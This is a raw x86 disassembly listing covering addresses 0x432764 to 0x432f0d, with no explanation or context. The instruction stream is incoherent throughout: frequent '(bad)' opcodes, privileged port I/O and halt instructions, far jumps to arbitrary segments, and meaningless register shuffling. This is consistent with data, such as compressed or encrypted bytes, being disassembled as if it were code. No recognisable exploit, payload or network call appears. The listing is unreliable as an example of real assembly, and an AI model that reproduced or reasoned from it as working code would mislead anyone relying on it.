  432764:	retf   0x3f11
  432767:	adc    eax,0xc604a032
  43276c:	mov    al,0xb8
  43276e:	fidiv  WORD PTR [ecx]
  432770:	das    
  432771:	push   0x3b
  432773:	addr16 aam 0xc0
  432776:	mov    bh,0x14
  432778:	dec    ecx
  432779:	jmp    0x34e3:0x5c117003
  432780:	jb     0x432777
  432782:	scas   al,BYTE PTR es:[edi]
  432783:	dec    edx
  432784:	mov    al,ds:0xb1e3bf62
  432789:	cdq    
  43278a:	dec    esp
  43278b:	dec    esp
  43278c:	fstp   QWORD PTR [ecx]
  43278e:	mov    dl,0x92
  432790:	mov    edi,0x599ffd86
  432795:	xchg   esp,eax
  432796:	enter  0x8f53,0x22
  43279a:	or     BYTE PTR [edi+0x0],bl
  43279d:	mov    ebx,0xea654ade
  4327a2:	rcr    DWORD PTR [ecx+0x7659de37],0x39
  4327a9:	gs xchg ebx,eax
  4327ab:	mov    edi,0x9165aa49
  4327b0:	cmp    ebx,edi
  4327b2:	ja     0x432760
  4327b4:	outs   dx,DWORD PTR ds:[esi]
  4327b5:	call   0x5aaf:0xcfe11ef0
  4327bc:	loope  0x432803
  4327be:	ret    
  4327bf:	nop
  4327c0:	add    al,0x77
  4327c2:	fs sbb eax,0xdc38f129
  4327c8:	lds    eax,FWORD PTR [esi+0x25c6f94]
  4327ce:	dec    esp
  4327cf:	jb     0x43282b
  4327d1:	stos   DWORD PTR es:[edi],eax
  4327d2:	std    
  4327d3:	adc    DWORD PTR [ecx],esp
  4327d5:	ret    
  4327d6:	ja     0x432808
  4327d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4327d9:	xor    cl,BYTE PTR [edx-0x61368a61]
  4327df:	enter  0xd14e,0xa
  4327e3:	scas   al,BYTE PTR es:[edi]
  4327e4:	sub    bh,BYTE PTR [ebp+0x59c09cd]
  4327ea:	jge    0x43283d
  4327ec:	add    dl,BYTE PTR [esi]
  4327ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4327ef:	lods   eax,DWORD PTR ds:[esi]
  4327f0:	mov    ds:0xc3ab5f7d,eax
  4327f5:	test   DWORD PTR [edi-0x38],ecx
  4327f8:	pop    eax
  4327f9:	fmul   st,st(4)
  4327fb:	push   edx
  4327fc:	scas   eax,DWORD PTR es:[edi]
  4327fd:	jmp    0xc6dc:0x5dd9205
  432804:	inc    edi
  432805:	jb     0x432885
  432807:	js     0x432811
  432809:	add    dh,BYTE PTR [edx]
  43280b:	js     0x4327c8
  43280d:	ds sbb ebp,eax
  432810:	cmp    al,0x3d
  432812:	ror    edx,0x3e
  432815:	and    eax,ebp
  432817:	dec    eax
  432818:	push   edx
  432819:	mov    ah,0xe1
  43281b:	imul   ebp,DWORD PTR [esi-0x4],0xffffffcb
  43281f:	out    dx,al
  432820:	jle    0x432850
  432822:	js     0x432809
  432824:	lods   eax,DWORD PTR ds:[esi]
  432825:	lods   al,BYTE PTR ds:[esi]
  432826:	xchg   ebx,eax
  432827:	ins    DWORD PTR es:[edi],dx
  432828:	fsubr  DWORD PTR [esi]
  43282a:	sar    DWORD PTR [edx-0x27],0x6f
  43282e:	inc    esi
  43282f:	in     eax,0xf7
  432831:	(bad)  
  432832:	jbe    0x43289e
  432834:	pop    es
  432835:	cwde   
  432836:	mov    edx,0x1dbf3d4f
  43283b:	sub    dh,BYTE PTR [esi+0x31]
  43283e:	test   al,0x71
  432840:	push   ebx
  432841:	mov    esp,0x6b359f14
  432846:	xor    ch,ch
  432848:	call   0x6736a331
  43284d:	dec    BYTE PTR [edi]
  43284f:	sar    ebp,cl
  432851:	jl     0x432810
  432853:	push   esi
  432854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432855:	test   al,0x5
  432857:	push   ecx
  432858:	(bad)  
  432859:	cmp    DWORD PTR [ecx+0x179db65e],esp
  43285f:	add    edi,DWORD PTR [ecx+0xd]
  432862:	sub    DWORD PTR [edx-0x503e8365],esi
  432868:	out    dx,al
  432869:	ins    BYTE PTR es:[edi],dx
  43286a:	mov    edi,0xf7db1565
  43286f:	or     eax,0x238f6a59
  432874:	jmp    FWORD PTR [ecx-0x16b76785]
  43287a:	mov    esi,0x6a70627f
  43287f:	xor    DWORD PTR [ebp-0x40633be],esi
  432885:	jbe    0x4328fa
  432887:	sub    BYTE PTR [edi+0x59],dl
  43288a:	mov    al,BYTE PTR [edi]
  43288c:	sub    esi,edx
  43288e:	pushf  
  43288f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432890:	not    DWORD PTR [eax-0x70]
  432893:	or     BYTE PTR ds:0xb1b85a28,ch
  432899:	mov    bh,bl
  43289b:	into   
  43289c:	hlt    
  43289d:	in     al,0xbb
  43289f:	and    eax,0x1cb3ad7
  4328a4:	out    0x6b,al
  4328a6:	loopne 0x4328ed
  4328a8:	adc    eax,0xffffffc1
  4328ab:	rcr    DWORD PTR [ebp-0x745004d8],0x79
  4328b2:	out    0x74,al
  4328b4:	jp     0x4328f2
  4328b6:	out    0x2,al
  4328b8:	mov    dl,0xd2
  4328ba:	sbb    BYTE PTR [ebx+0x17],al
  4328bd:	in     eax,0x5a
  4328bf:	dec    edx
  4328c0:	ins    DWORD PTR es:[edi],dx
  4328c1:	ret    0x656e
  4328c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4328c5:	(bad)  
  4328c8:	inc    ecx
  4328c9:	lods   eax,DWORD PTR ds:[esi]
  4328ca:	loopne 0x432880
  4328cc:	out    0xec,eax
  4328ce:	gs xor al,0x6
  4328d1:	test   eax,0x5efd59b4
  4328d6:	push   esi
  4328d7:	adc    ch,BYTE PTR [esi+0x33]
  4328da:	or     eax,0x20ab2dfa
  4328df:	aas    
  4328e0:	iret   
  4328e1:	lds    edi,FWORD PTR [eax]
  4328e3:	popa   
  4328e4:	stc    
  4328e5:	aas    
  4328e6:	push   ebp
  4328e7:	pop    ss
  4328e8:	and    DWORD PTR [edi-0x22e531cd],ebp
  4328ee:	out    0xd0,eax
  4328f0:	pop    edi
  4328f1:	add    al,0x90
  4328f3:	in     eax,0x75
  4328f5:	mov    bh,0xef
  4328f7:	mov    al,0x4c
  4328f9:	sub    DWORD PTR [eax+edx*2],esp
  4328fc:	adc    BYTE PTR [ebp-0x72],dl
  4328ff:	aaa    
  432900:	mov    BYTE PTR [edi+0x1f],bh
  432903:	mov    ch,0xb8
  432905:	inc    edx
  432906:	add    al,0x5f
  432908:	push   edi
  432909:	jno    0x4328d6
  43290b:	pusha  
  43290c:	cmp    al,0x67
  43290e:	enter  0x152d,0x26
  432912:	xor    esp,esi
  432914:	sbb    BYTE PTR [ecx],bh
  432916:	dec    ebp
  432917:	sbb    BYTE PTR [edi],al
  432919:	jle    0x432951
  43291b:	in     eax,dx
  43291c:	or     BYTE PTR [esi+0x39],al
  43291f:	into   
  432920:	repz mov ebp,0x1dc1f114
  432926:	jp     0x432946
  432928:	into   
  432929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43292a:	rcl    BYTE PTR [edx+0xa9cf405],0x7c
  432931:	rcl    DWORD PTR [ebx-0x15b9c7a3],1
  432937:	cs cmp al,0x22
  43293a:	mov    ds:0x1ec7c00f,al
  43293f:	pop    edx
  432940:	mov    ebx,0xb2d04b64
  432945:	inc    ecx
  432946:	jg     0x432972
  432948:	push   cs
  432949:	add    DWORD PTR [edx+0x1852f96],ebx
  43294f:	ss clc 
  432951:	mov    edx,0xdb7ada01
  432956:	pop    es
  432957:	mov    esi,0xef6e14a7
  43295c:	cdq    
  43295d:	(bad)  
  43295e:	cmp    DWORD PTR [edx+ebp*2],ecx
  432961:	jl     0x43296e
  432963:	or     eax,0xacb0099d
  432968:	retf   0xacb2
  43296b:	fisub  DWORD PTR [edx]
  43296d:	js     0x4329ba
  43296f:	lahf   
  432970:	or     esi,ebp
  432972:	cmp    ah,cl
  432974:	pusha  
  432975:	push   cs
  432976:	adc    eax,0xcabdb79a
  43297b:	mov    ds:0xcd21e7ef,al
  432980:	mov    ecx,0xa05d41a9
  432985:	sub    BYTE PTR [edx],bl
  432987:	in     eax,0x68
  432989:	mov    al,ds:0x8846f315
  43298e:	popf   
  43298f:	test   ecx,ecx
  432991:	jmp    0x8ceb:0xdfd897d6
  432998:	and    eax,0xe2e5fb8c
  43299d:	stos   BYTE PTR es:[edi],al
  43299e:	and    BYTE PTR [esi-0x58b6a7fb],ah
  4329a4:	stc    
  4329a5:	outs   dx,BYTE PTR ds:[esi]
  4329a6:	in     al,dx
  4329a7:	fsubp  st(3),st
  4329a9:	jmp    0x3873:0x902f255d
  4329b0:	sub    ch,cl
  4329b2:	into   
  4329b3:	xor    edi,DWORD PTR [ebx-0x47]
  4329b6:	xchg   esp,eax
  4329b7:	mov    ds:0x1b8db199,eax
  4329bc:	enter  0x7044,0xe0
  4329c0:	sti    
  4329c1:	ret    0x4f82
  4329c4:	sbb    edi,DWORD PTR gs:[edi]
  4329c7:	icebp  
  4329c8:	and    DWORD PTR [ecx],edi
  4329ca:	or     esp,DWORD PTR ds:0x62169c81
  4329d0:	loope  0x432992
  4329d2:	daa    
  4329d3:	xchg   BYTE PTR [edx-0x53],cl
  4329d6:	(bad)  
  4329d7:	pushf  
  4329d8:	(bad)  
  4329da:	xchg   ecx,eax
  4329db:	mov    esi,0x406d832a
  4329e0:	xchg   esp,eax
  4329e1:	mov    ah,0x25
  4329e3:	mov    ebp,0xb208a0f4
  4329e8:	xor    bl,0xa9
  4329eb:	ror    BYTE PTR [edx+eax*4],cl
  4329ee:	gs push esi
  4329f0:	cdq    
  4329f1:	push   eax
  4329f2:	inc    edi
  4329f3:	sbb    eax,0x649deb7a
  4329f8:	icebp  
  4329f9:	ins    BYTE PTR es:[edi],dx
  4329fa:	dec    esi
  4329fb:	xor    edx,esi
  4329fd:	add    ebx,0x9
  432a00:	loopne 0x43298f
  432a02:	xchg   esi,eax
  432a03:	and    bl,dl
  432a05:	sahf   
  432a06:	das    
  432a07:	jmp    0x7bb6706a
  432a0c:	shr    BYTE PTR [edx+0x22b7019b],1
  432a12:	xor    dh,dl
  432a14:	sub    bh,BYTE PTR [edx+0x67]
  432a17:	outs   dx,DWORD PTR ds:[esi]
  432a18:	cmp    eax,0x2af62825
  432a1d:	inc    ebp
  432a1e:	or     BYTE PTR [ebx-0x38164b48],dh
  432a24:	jge    0x4329f4
  432a26:	jnp    0x4329e3
  432a28:	ror    DWORD PTR [eax+0x8],1
  432a2b:	popa   
  432a2c:	sti    
  432a2d:	dec    edi
  432a2e:	jmp    DWORD PTR [eax]
  432a30:	(bad)  
  432a31:	jecxz  0x4329ff
  432a33:	mov    cl,0x16
  432a35:	cmp    dl,BYTE PTR [esi]
  432a37:	imul   eax,DWORD PTR [esi-0x5c],0x2179595
  432a3e:	dec    esi
  432a3f:	sub    cl,dh
  432a41:	test   al,0x83
  432a43:	lods   al,BYTE PTR ds:[esi]
  432a44:	jno    0x432a5d
  432a46:	lahf   
  432a47:	aam    0x67
  432a49:	inc    esi
  432a4a:	jo     0x432a91
  432a4c:	dec    eax
  432a4d:	jle    0x432a93
  432a4f:	ja     0x432a8e
  432a51:	ficom  WORD PTR [esi+0x64]
  432a54:	sub    eax,0xa7b6460d
  432a59:	aas    
  432a5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432a5b:	push   esp
  432a5c:	pop    edx
  432a5d:	outs   dx,DWORD PTR ds:[esi]
  432a5e:	adc    ebx,DWORD PTR [eax-0x2d3db268]
  432a64:	lds    ecx,FWORD PTR [esi]
  432a66:	lods   al,BYTE PTR ds:[esi]
  432a67:	test   al,0x6
  432a69:	jmp    0x3412:0xbc6b16eb
  432a70:	imul   esp
  432a72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432a73:	lock out 0x94,eax
  432a76:	lods   eax,DWORD PTR ds:[esi]
  432a77:	jg     0x432abd
  432a79:	psrld  mm6,QWORD PTR [edx-0x53963cb3]
  432a80:	inc    ecx
  432a81:	mov    bl,0x16
  432a83:	sub    eax,0x153c5ab0
  432a88:	sahf   
  432a89:	sub    dh,BYTE PTR [esi+0x6e]
  432a8c:	lahf   
  432a8d:	sub    DWORD PTR [eax-0x67293a00],esp
  432a93:	pusha  
  432a94:	leave  
  432a95:	lahf   
  432a96:	popa   
  432a97:	and    esi,DWORD PTR [ebx]
  432a99:	(bad)  
  432a9a:	dec    ebx
  432a9b:	pop    ds
  432a9c:	loop   0x432ae5
  432a9e:	mov    ebp,0x75524cad
  432aa3:	call   0xf19fe5ac
  432aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432aa9:	dec    ebx
  432aaa:	sbb    BYTE PTR [edi+ebx*1],ch
  432aad:	cmp    eax,0xb94c6202
  432ab2:	mov    cl,BYTE PTR [ebx]
  432ab4:	sub    dh,BYTE PTR [ebx]
  432ab6:	push   0xf5ff7b29
  432abb:	or     DWORD PTR [ebp+0x36],esp
  432abe:	shr    DWORD PTR [ebx],0xc2
  432ac1:	loope  0x432aa9
  432ac3:	adc    al,BYTE PTR [ebp+edi*4-0x4f]
  432ac7:	fsubr  QWORD PTR [edx+0x2e]
  432aca:	(bad)  
  432acb:	sbb    BYTE PTR [edx],dh
  432acd:	xchg   esp,eax
  432ace:	adc    eax,0xb4b94016
  432ad3:	fisttp WORD PTR [esi-0x1b]
  432ad6:	in     eax,0x3
  432ad8:	cmp    ebx,esp
  432ada:	dec    edx
  432adb:	sub    DWORD PTR ds:0x6f918b3f,edx
  432ae1:	rcl    BYTE PTR cs:[eax],1
  432ae4:	mov    bh,0xe1
  432ae6:	add    ch,ah
  432ae8:	dec    ecx
  432ae9:	popa   
  432aea:	xchg   edx,eax
  432aeb:	rcr    BYTE PTR [edx+0x3089d453],cl
  432af1:	(bad)  [eax-0x11]
  432af4:	mov    dh,0x83
  432af6:	es push edi
  432af8:	sub    eax,0xba3ddd5d
  432afd:	hlt    
  432afe:	sahf   
  432aff:	and    eax,0x9b039fc2
  432b04:	pop    ds
  432b05:	adc    ebp,esi
  432b07:	push   edx
  432b08:	cld    
  432b09:	inc    ebp
  432b0a:	aaa    
  432b0b:	jecxz  0x432b82
  432b0d:	cld    
  432b0e:	ret    0x7b9e
  432b11:	sar    ecx,1
  432b13:	or     esi,DWORD PTR [esi+0x6b157887]
  432b19:	mov    eax,0xc85b32e2
  432b1e:	adc    DWORD PTR [ebx-0x5d],edi
  432b21:	jle    0x432aef
  432b23:	inc    ebp
  432b24:	in     eax,dx
  432b25:	sbb    DWORD PTR [esp+edi*1+0x67394066],ebp
  432b2c:	in     eax,0x9f
  432b2e:	fisub  DWORD PTR [edx]
  432b30:	outs   dx,DWORD PTR ds:[esi]
  432b31:	sbb    edi,DWORD PTR [ebx-0xb757007]
  432b37:	psadbw mm3,mm1
  432b3a:	sbb    dl,al
  432b3c:	ficom  WORD PTR [edx]
  432b3e:	bound  ecx,QWORD PTR ds:0xde908161
  432b44:	sbb    al,0xb4
  432b46:	(bad)  
  432b47:	cld    
  432b48:	mov    WORD PTR [ebp-0x62],cs
  432b4b:	and    cl,BYTE PTR [ecx+0x49]
  432b4e:	push   ecx
  432b4f:	cdq    
  432b50:	in     al,0x37
  432b52:	xor    eax,0xb8c431a2
  432b57:	shl    DWORD PTR [esp+eax*8+0x26],0x51
  432b5c:	test   al,0xc5
  432b5e:	retf   0x5fd9
  432b61:	push   edi
  432b62:	cmp    BYTE PTR [esi],al
  432b64:	das    
  432b65:	clc    
  432b66:	cli    
  432b67:	dec    edx
  432b68:	dec    esp
  432b69:	jne    0x432b2f
  432b6b:	rol    BYTE PTR [eax-0xe420520],0x66
  432b72:	xchg   ebx,eax
  432b73:	xor    DWORD PTR [esi-0x67b8c5a5],esp
  432b79:	push   esp
  432b7a:	jg     0x432b58
  432b7c:	dec    ebx
  432b7d:	mov    ebx,ebx
  432b7f:	mov    eax,0x8e605be2
  432b84:	test   DWORD PTR [ebx+0x7b],ecx
  432b87:	push   0xc597948d
  432b8c:	cld    
  432b8d:	sub    cl,bl
  432b8f:	pop    es
  432b90:	cmc    
  432b91:	mov    esp,0x8bf9021b
  432b96:	outs   dx,BYTE PTR ds:[esi]
  432b97:	push   cs
  432b98:	stc    
  432b99:	jae    0x432b50
  432b9b:	xor    al,0xdc
  432b9d:	sbb    BYTE PTR [ebx],bh
  432b9f:	out    0x7d,eax
  432ba1:	leave  
  432ba2:	int    0x56
  432ba4:	add    eax,0x8fefa3be
  432ba9:	inc    edi
  432baa:	pop    ebp
  432bab:	sbb    BYTE PTR [ebx],ch
  432bad:	lahf   
  432bae:	repnz sbb eax,0x38ed8b70
  432bb4:	jbe    0x432b54
  432bb6:	and    ebx,ebx
  432bb8:	stc    
  432bb9:	out    0x6b,eax
  432bbb:	sbb    ebp,DWORD PTR [ebx+0x3ca999be]
  432bc1:	sbb    al,0xfc
  432bc3:	pop    edi
  432bc4:	scas   eax,DWORD PTR es:[edi]
  432bc5:	sbb    ah,BYTE PTR [ebx-0x34de8556]
  432bcb:	mov    ds:0x7a516bc8,eax
  432bd0:	shr    BYTE PTR [edx-0x380728b4],cl
  432bd6:	loop   0x432c1d
  432bd8:	xchg   dh,cl
  432bda:	mov    esp,0x53b2ea99
  432bdf:	mov    ebp,0xa616bfbc
  432be4:	jl     0x432bfa
  432be6:	cwde   
  432be7:	jle    0x432bcd
  432be9:	mov    bl,0xb2
  432beb:	pop    esi
  432bec:	pop    eax
  432bed:	adc    esp,DWORD PTR [ebx]
  432bef:	or     dh,BYTE PTR ds:0xf074c6ce
  432bf5:	and    ch,BYTE PTR [ebx-0x428a937e]
  432bfb:	mov    bl,0x93
  432bfd:	nop
  432bfe:	das    
  432bff:	icebp  
  432c00:	js     0x432c71
  432c02:	xchg   edi,eax
  432c03:	push   es
  432c04:	stos   DWORD PTR es:[edi],eax
  432c05:	and    al,0x62
  432c07:	stc    
  432c08:	xlat   BYTE PTR ds:[ebx]
  432c09:	in     eax,0xdb
  432c0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432c0c:	xchg   esp,eax
  432c0d:	xchg   esi,eax
  432c0e:	xor    BYTE PTR [esi+0x701e6d95],0x40
  432c15:	inc    ecx
  432c16:	retf   
  432c17:	jmp    0xb2eb26ff
  432c1c:	test   BYTE PTR [edx+eiz*8-0x20b5e8e],al
  432c23:	fcom   DWORD PTR [edi+0x53]
  432c26:	push   ss
  432c27:	ret    
  432c28:	lea    esp,[ebx+0x53b0e456]
  432c2e:	jnp    0x432bb6
  432c30:	xor    esp,DWORD PTR [esi+eax*4-0x30d4b967]
  432c37:	mov    ebx,DWORD PTR [edx-0x10]
  432c3a:	mov    bl,0x2e
  432c3c:	sbb    BYTE PTR [edx],bl
  432c3e:	pop    ebx
  432c3f:	push   es
  432c40:	mov    es,ecx
  432c42:	cmp    eax,0x2398c521
  432c47:	jg     0x432cb6
  432c49:	cld    
  432c4a:	das    
  432c4b:	imul   eax,DWORD PTR [ebp-0x3b8429e1],0x955318c1
  432c55:	retf   0x1a1
  432c58:	sub    eax,0x72972749
  432c5d:	dec    edi
  432c5e:	hlt    
  432c5f:	in     al,0x1a
  432c61:	jge    0x432c53
  432c63:	mov    ecx,0x1bcece4e
  432c68:	or     eax,0x48e0d418
  432c6d:	(bad)
  432c70:	rol    DWORD PTR [edi+0xb3a34db],1
  432c76:	neg    cl
  432c78:	pushf  
  432c79:	loopne 0x432ca2
  432c7b:	mov    ds,WORD PTR [esi]
  432c7d:	ret    
  432c7e:	les    ebp,FWORD PTR [ebx+0x428da68b]
  432c84:	mov    ebp,0x3e5979d9
  432c8a:	jecxz  0x432cbb
  432c8c:	xor    DWORD PTR [edi],ebp
  432c8e:	sahf   
  432c8f:	in     eax,0x3e
  432c91:	imul   edi,DWORD PTR [edx+0x15],0xffffffc1
  432c95:	sub    eax,0x6fa7b53b
  432c9a:	mov    DWORD PTR [edi],ebp
  432c9c:	dec    esp
  432c9d:	xchg   ebx,eax
  432c9e:	inc    ebp
  432c9f:	mov    ds:0x66c5126a,al
  432ca4:	push   eax
  432ca5:	fst    DWORD PTR [ecx-0x7630f548]
  432cab:	hlt    
  432cac:	push   ebx
  432cad:	pop    ecx
  432cae:	loope  0x432c3a
  432cb0:	add    al,0xcb
  432cb2:	xor    DWORD PTR [ecx+eiz*8+0x2e],ebx
  432cb6:	sbb    esp,DWORD PTR [esi]
  432cb8:	cmp    DWORD PTR [ecx],ebp
  432cba:	mov    esp,0x3ff0a0e2
  432cbf:	jmp    0x3fe37e99
  432cc4:	sti    
  432cc5:	inc    edi
  432cc6:	(bad)  
  432cc7:	xchg   edx,eax
  432cc8:	(bad)  
  432cc9:	sbb    ebx,DWORD PTR [ebx+esi*1+0x75e07a7f]
  432cd0:	add    al,0x1f
  432cd2:	mov    al,0x45
  432cd4:	out    dx,al
  432cd5:	rdpmc  
  432cd7:	std    
  432cd8:	add    esi,esp
  432cda:	dec    ebx
  432cdb:	mov    ds:0x2100bd80,eax
  432ce0:	(bad)  
  432ce1:	mov    ebp,0xcecec88
  432ce6:	jo     0x432c89
  432ce8:	sahf   
  432ce9:	dec    ebp
  432cea:	mov    dh,0x59
  432cec:	add    eax,0x9d115bce
  432cf1:	retf   
  432cf2:	scas   al,BYTE PTR es:[edi]
  432cf3:	mov    esi,0x991c9c55
  432cf8:	mov    dh,0x4f
  432cfa:	int    0x5f
  432cfc:	fsub   DWORD PTR [esi-0x4214405c]
  432d02:	aam    0x29
  432d04:	jg     0x432cb1
  432d06:	push   esp
  432d07:	jge    0x432d1b
  432d09:	or     cl,bl
  432d0b:	in     al,dx
  432d0c:	dec    ebp
  432d0d:	mov    ebp,0x4200fa04
  432d12:	call   0x1ef6:0x544c686b
  432d19:	inc    esi
  432d1a:	out    dx,eax
  432d1b:	xor    dl,cl
  432d1d:	mov    ah,0x1c
  432d1f:	sar    bh,1
  432d21:	pop    esi
  432d22:	dec    ebp
  432d23:	iret   
  432d24:	push   eax
  432d25:	dec    ecx
  432d26:	ret    0x2dee
  432d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432d2a:	jo     0x432d93
  432d2c:	xchg   dh,ch
  432d2e:	out    dx,al
  432d2f:	jne    0x432d6a
  432d31:	sbb    bh,BYTE PTR [ebp+eiz*1+0x30]
  432d35:	pop    eax
  432d36:	dec    edx
  432d37:	mov    eax,ds:0x66d9439d
  432d3c:	jecxz  0x432da5
  432d3e:	xchg   BYTE PTR [edi-0x29],dl
  432d41:	aaa    
  432d42:	aad    0xd1
  432d44:	mov    cl,0x31
  432d46:	sbb    BYTE PTR [ebp+edx*8+0x69],cl
  432d4a:	jne    0x432dcb
  432d4c:	jl     0x432d1a
  432d4e:	jno    0x432cd9
  432d50:	push   ecx
  432d51:	add    BYTE PTR [eax+edx*8],bl
  432d54:	fidivr WORD PTR [eax]
  432d56:	push   eax
  432d57:	pop    ebx
  432d58:	push   0xe3af1e75
  432d5d:	cwde   
  432d5e:	das    
  432d5f:	fistp  DWORD PTR [ebp-0x38c68f8]
  432d65:	or     BYTE PTR [edi],ch
  432d67:	pop    es
  432d68:	mov    bl,0x38
  432d6a:	sbb    BYTE PTR cs:[edi+0x3e7c33da],dl
  432d71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d72:	scas   al,BYTE PTR es:[edi]
  432d73:	xchg   esi,eax
  432d74:	or     esp,esp
  432d76:	in     eax,0x4c
  432d78:	icebp  
  432d79:	or     ebp,DWORD PTR [ebx]
  432d7b:	add    cl,cl
  432d7d:	push   ecx
  432d7e:	fild   WORD PTR [ebp+ecx*4-0x17]
  432d82:	jo     0x432d8f
  432d84:	inc    DWORD PTR [ebp+0x51]
  432d87:	sub    bl,cl
  432d89:	mov    ecx,0x96a5ed5c
  432d8e:	xor    eax,0x6c706efe
  432d93:	iret   
  432d94:	fs mov ebx,0x146efda5
  432d9a:	add    DWORD PTR ds:0x95b768e1,ebx
  432da0:	jno    0x432da9
  432da2:	aas    
  432da3:	jo     0x432dd4
  432da5:	lds    esp,FWORD PTR [esi-0x62a56bfd]
  432dab:	mov    cl,BYTE PTR [ebp+0x6ee78d18]
  432db1:	inc    edx
  432db2:	mov    ?,WORD PTR [edi+0x16eb1934]
  432db8:	or     dh,dh
  432dba:	jge    0x432dcd
  432dbc:	call   0xe4f:0xac1cc728
  432dc3:	add    ebp,DWORD PTR ss:[esi-0x62d95b83]
  432dca:	sbb    edx,DWORD PTR [ebx+0x4d68c423]
  432dd0:	add    ch,dh
  432dd2:	and    DWORD PTR [ecx+0x1b],ebx
  432dd5:	jmp    0x71485c44
  432dda:	retf   0xfb17
  432ddd:	xchg   DWORD PTR [ecx-0x52],esp
  432de0:	rcl    BYTE PTR [bp+di],0x77
  432de4:	and    ecx,0xfffffffb
  432de7:	inc    ecx
  432de8:	add    edx,edx
  432dea:	mov    ebp,0x412d31b1
  432def:	xchg   ecx,eax
  432df0:	ja     0x432e5c
  432df2:	xor    DWORD PTR [edi],edi
  432df4:	push   0x3d
  432df6:	leave  
  432df7:	sbb    ebp,DWORD PTR [ebx+0x438a58f2]
  432dfd:	fdivrp st(1),st
  432dff:	clc    
  432e00:	lods   al,BYTE PTR ds:[esi]
  432e01:	push   es
  432e02:	push   edi
  432e03:	leave  
  432e04:	mov    bh,0x1a
  432e06:	test   al,0xaa
  432e08:	xchg   DWORD PTR [edx+0x7341d20b],ecx
  432e0e:	(bad)  
  432e0f:	(bad)  
  432e10:	dec    edi
  432e11:	pusha  
  432e12:	loop   0x432e00
  432e14:	retf   
  432e15:	xor    al,0x50
  432e17:	xor    esp,DWORD PTR [edi]
  432e19:	stc    
  432e1a:	mov    bl,0xb4
  432e1c:	jg     0x432e8f
  432e1e:	or     ah,BYTE PTR [edi-0x2f]
  432e21:	mov    ebx,0xa4897e73
  432e26:	sti    
  432e27:	add    ebp,ebx
  432e29:	mov    eax,ds:0x341bd975
  432e2e:	sbb    bl,BYTE PTR [edi+edx*1-0x1ac1700f]
  432e35:	add    ah,BYTE PTR [ecx-0x5e]
  432e38:	jmp    0x432e35
  432e3a:	or     al,0xa0
  432e3c:	xchg   ebp,eax
  432e3d:	sbb    DWORD PTR [eax],edx
  432e3f:	addr16 push eax
  432e41:	pop    esp
  432e42:	inc    ecx
  432e43:	ds icebp 
  432e45:	fist   DWORD PTR [edx-0x3e5c5509]
  432e4b:	xchg   ebx,eax
  432e4c:	ja     0x432e1c
  432e4e:	mov    BYTE PTR [eax-0x383f1633],bh
  432e54:	mov    ebx,esi
  432e56:	icebp  
  432e57:	and    BYTE PTR [esi-0x425e8c81],0x7b
  432e5e:	inc    edx
  432e5f:	fwait
  432e60:	sbb    BYTE PTR [esi],bh
  432e62:	stos   BYTE PTR es:[edi],al
  432e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432e64:	push   0x27feb1cc
  432e69:	push   cs
  432e6a:	imul   edx,DWORD PTR es:[esi-0x419a57e5],0x16
  432e72:	push   es
  432e73:	dec    esp
  432e74:	shl    ebp,0xcb
  432e77:	(bad)  
  432e78:	xlat   BYTE PTR ds:[ebx]
  432e79:	and    BYTE PTR [ecx-0x31],al
  432e7c:	stos   BYTE PTR es:[edi],al
  432e7d:	mul    BYTE PTR [eax+0x7b86e4e7]
  432e83:	popf   
  432e84:	or     BYTE PTR [edx+ecx*4],dl
  432e87:	lahf   
  432e88:	enter  0xe1be,0x51
  432e8c:	std    
  432e8d:	xor    DWORD PTR [edi],edi
  432e8f:	mov    dl,0x96
  432e91:	ret    
  432e92:	(bad)  
  432e93:	fcmovnb st,st(1)
  432e95:	(bad)  
  432e96:	lock aaa 
  432e98:	dec    ecx
  432e99:	inc    ecx
  432e9a:	xor    BYTE PTR ds:0xcbd370f9,ch
  432ea0:	pop    ebp
  432ea1:	call   0xf12567d7
  432ea6:	sbb    BYTE PTR [esi+0xf],bh
  432ea9:	jb     0x432ec9
  432eab:	call   0x28bbd481
  432eb0:	out    0xc8,al
  432eb2:	dec    esi
  432eb3:	in     eax,0xaf
  432eb5:	mov    eax,DWORD PTR ds:0xa33a1a02
  432ebb:	xor    al,0xa
  432ebd:	add    ecx,eax
  432ebf:	adc    BYTE PTR [eax],0x58
  432ec2:	pop    es
  432ec3:	sub    ch,ah
  432ec5:	ret    
  432ec6:	test   al,0xdf
  432ec8:	les    esp,FWORD PTR [eax-0x1e]
  432ecb:	stos   BYTE PTR es:[edi],al
  432ecc:	adc    edx,edi
  432ece:	iret   
  432ecf:	pop    esi
  432ed0:	ins    BYTE PTR es:[edi],dx
  432ed1:	dec    ebx
  432ed2:	and    al,0xa7
  432ed4:	std    
  432ed5:	pop    edx
  432ed6:	stos   BYTE PTR es:[edi],al
  432ed7:	sbb    DWORD PTR [ebx+ecx*1],edx
  432eda:	xchg   ebx,eax
  432edb:	pop    ss
  432edc:	or     dl,BYTE PTR ds:0xf07b8e23
  432ee2:	mov    cl,0x65
  432ee4:	ret    
  432ee5:	push   eax
  432ee6:	int3   
  432ee7:	push   ebx
  432ee8:	mov    dl,BYTE PTR [ecx+0x2d]
  432eeb:	hlt    
  432eec:	ds loopne 0x432ecc
  432eef:	pushf  
  432ef0:	and    eax,0x283944b2
  432ef5:	dec    ebx
  432ef6:	(bad)  
  432ef7:	mov    ecx,0xfb2555d6
  432efc:	xchg   esi,eax
  432efd:	push   ecx
  432efe:	stos   DWORD PTR es:[edi],eax
  432eff:	fist   DWORD PTR [edx]
  432f01:	stos   DWORD PTR es:[edi],eax
  432f02:	cmp    DWORD PTR [eax+0x28d5d39f],ebx
  432f08:	cmp    ch,BYTE PTR [esi+0xf]
  432f0b:	iret   
  432f0c:	push   esi
  432f0d:	mov    ebp,0x7ae954f2
